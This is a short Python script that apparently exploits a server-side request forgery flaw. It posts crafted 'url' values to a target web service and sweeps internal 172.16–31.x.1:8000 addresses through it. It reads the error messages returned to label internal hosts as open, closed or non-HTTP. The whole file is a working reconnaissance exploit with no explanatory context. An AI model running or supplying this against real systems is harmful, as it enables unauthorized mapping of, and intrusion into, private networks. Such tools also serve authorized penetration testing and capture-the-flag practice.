#!/usr/bin/env python3

import argparse
import requests

# Set up argument parser
parser = argparse.ArgumentParser()
parser.add_argument('-t', '--target', help='host/ip to target', required=True)
parser.add_argument('--timeout', help='timeout', required=False, default=3)
parser.add_argument('-s', '--ssrf', help='ssrf target', required=True)
parser.add_argument('-v', '--verbose', help='enable verbose mode', action="store_true", default=False)

args = parser.parse_args()

timeout = float(args.timeout)

# Scan a range of IP addresses
baseurl = args.target
base_ip = "http://172.{two}.{three}.1"

for y in range(16, 32):  # 172.16.0.0 to 172.31.255.255
    for x in range(0, 256):  # 172.x.0.1 to 172.x.255.1
        host = base_ip.format(two=y, three=x)
        print("Trying host: {host}".format(host=host))
        try:
            r = requests.post(url=baseurl, json={"url": "{host}:8000".format(host=host)}, timeout=timeout)
            if args.verbose:
                print("Host: {host} \t Response: {response}".format(host=host, response=r.text))

            if "You don't have permission to access this." in r.text:
                print("{host} \t OPEN - returned permission error, therefore valid resource".format(host=host))
            elif "ECONNREFUSED" in r.text:
                print("{host} \t CLOSED".format(host=host))
            elif "Request failed with status code 404" in r.text:
                print("{host} \t OPEN - returned 404".format(host=host))
            elif "Expected HTTP" in r.text:
                print("{host} \t ???? - returned parse error, potentially open non-http".format(host=host))
            elif "socket hang up" in r.text:
                print("{host} \t OPEN - socket hang up, likely non-http".format(host=host))
            else:
                print("{host} \t {response}".format(host=host, response=r.text))
        except requests.exceptions.Timeout:
            print("{host} \t timed out".format(host=host)) 
        except requests.exceptions.RequestException as e:
            print("{host} \t Request failed: {error}".format(host=host, error=str(e)))
